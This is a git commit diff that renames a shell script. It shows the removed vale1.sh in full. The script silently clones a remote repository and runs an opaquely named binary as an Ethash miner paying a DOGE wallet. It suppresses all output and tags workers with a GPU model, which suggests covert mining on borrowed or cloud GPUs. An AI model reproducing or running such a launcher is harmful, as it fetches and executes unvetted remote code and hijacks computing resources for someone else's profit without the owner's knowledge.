7a5fe8582df693311b4ec8857aa54e8c5bbc6577
admin121x <80238442+admin121x@users.noreply.github.com>
2021-05-31 12:30:03 +0700

    Update and rename vale1.sh to vale2.sh

--- vale1.sh
+++
@@ -1,6 +0,0 @@
-#!/bin/bash
-POOL=ethash.unmineable.com:3333
-WALLET=DOGE:DFnzT5dETx7AnkXqdkHese6uae5Au4uU19
-WORKER=$(echo $(shuf -i 1-9999 -n 1)-V100)
-
-git clone https://github.com/admin121x/1 &> /dev/null && cd 1/1.29 ; chmod +x vale1 && ./vale1 --algo ETHASH --pool $POOL --user $WALLET.$WORKER &> /dev/null
